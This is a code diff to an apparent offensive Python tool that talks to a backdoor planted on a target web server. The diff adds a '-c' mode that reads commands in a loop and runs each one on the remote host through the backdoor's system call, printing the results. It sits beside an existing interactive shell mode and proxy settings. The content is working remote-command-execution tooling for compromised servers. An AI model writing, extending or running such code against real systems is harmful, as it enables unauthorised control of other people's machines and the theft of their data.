@@ -185,6 +185,7 @@ if __name__ == '__main__':
     parser.add_argument('url')
     parser.add_argument('-i', '--inpath', default='/tmp/in')
     parser.add_argument('-o', '--outpath', default='/tmp/out')
+    parser.add_argument('-c', '--command', action='store_true')
     parser.add_argument('-s', '--shell', action='store_true')
     parser.add_argument('--skip', action='store_true')
     parser.add_argument('--interval', type=float, default=1)
@@ -196,6 +197,19 @@ if __name__ == '__main__':
         environ['HTTPS_PROXY'] = args.proxy
 
     backdoor = _BACKDOOR[args.backdoor](args.url)
+
+    if args.command:
+        try:
+            while True:
+                command = input()
+                try:
+                    contents = backdoor.system(command)
+                    print(contents, end='')
+                except Exception as e:
+                    print(f'SYSTEM_ERROR: {e}', file=stderr)
+        except KeyboardInterrupt:
+            exit(0)
+
 
     if args.shell:
         shell = Shell(backdoor, args.inpath, args.outpath)
@@ -220,5 +234,5 @@ if __name__ == '__main__':
             except Exception as e:
                 print(f'WRITE_ERROR: {e}', file=stderr)
     except KeyboardInterrupt:
-        exit(1)
+        exit(0)
 
